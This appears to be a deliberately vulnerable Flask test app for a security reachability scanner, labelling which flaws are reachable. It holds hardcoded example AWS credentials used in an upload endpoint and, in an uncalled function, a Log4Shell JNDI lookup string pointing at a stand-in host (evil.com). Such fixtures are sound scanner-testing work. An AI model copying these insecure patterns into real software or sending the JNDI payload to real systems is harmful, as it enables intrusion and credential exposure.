# Copyright © 2026 Sthenos Security. All rights reserved.

# Python Test App - Known Vulnerabilities
#
# This app contains intentional vulnerabilities for testing REACHABLE:
# - CVE-2022-42969 (pypdf ReDoS) - REACHABLE
# - CVE-2021-44228 (Log4Shell via py4j) - UNREACHABLE (not called)
# - Hardcoded AWS secret - REACHABLE
# - Dead secret - UNREACHABLE

from flask import Flask, request, jsonify
from pypdf import PdfReader  # CVE-2022-42969 - ReDoS vulnerability
from admin_bp import admin_bp  # imported but NEVER registered — Type A

# NOTE: dead/unused_views.py defines views but is NEVER imported (Type C).
# NOTE: admin_bp IS imported above but never app.register_blueprint()'d (Type A).

app = Flask(__name__)
# admin_bp deliberately NOT registered — Type A dead code

# ============================================================================
# ============================================================================
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"  # Fake but pattern-matching
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

@app.route('/api/parse-pdf', methods=['POST'])
def parse_pdf():
    """
    REACHABLE CVE: CVE-2022-42969 (pypdf)
    This endpoint calls PdfReader which has a ReDoS vulnerability.
    Attack path: HTTP POST -> parse_pdf() -> PdfReader()
    """
    if 'file' not in request.files:
        return jsonify({'error': 'No file'}), 400
    
    file = request.files['file']
    reader = PdfReader(file)  # VULNERABLE CALL - ReDoS
    
    text = ""
    for page in reader.pages:
        text += page.extract_text()
    
    return jsonify({'text': text, 'pages': len(reader.pages)})

@app.route('/api/upload', methods=['POST'])
def upload_to_s3():
    """
    REACHABLE SECRET: Uses hardcoded AWS credentials
    This should trigger TOXIC_COMBINATION (active + reachable)
    """
    import boto3
    
    # Using hardcoded credentials - BAD!
    client = boto3.client(
        's3',
        aws_access_key_id=AWS_ACCESS_KEY,
        aws_secret_access_key=AWS_SECRET_KEY,
    )
    
    # ... upload logic
    return jsonify({'status': 'uploaded'})

@app.route('/api/health')
def health():
    """Simple health check - no vulnerabilities"""
    return jsonify({'status': 'ok'})

# ============================================================================
# UNREACHABLE CODE - No path from entrypoints
# ============================================================================

def unused_log4j_wrapper():
    """
    UNREACHABLE CVE: Log4Shell via py4j
    This function is never called, so CVE should be marked unreachable.
    """
    from py4j.java_gateway import JavaGateway  # Has transitive Log4j dep
    gateway = JavaGateway()
    # This would be vulnerable but it's never reached
    gateway.entry_point.log("${jndi:ldap://evil.com/a}")

def dead_secret_function():
    """
    UNREACHABLE SECRET: Dead secret in dead code
    This should be SECURITY_DEBT (inactive + unreachable)
    """
    # This key was rotated and is no longer valid
    OLD_API_KEY = "sk-REVOKED-xxxxxxxxxxxxxxxxxxxxxxxx"
    return OLD_API_KEY

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    app.run(debug=True, port=5000)
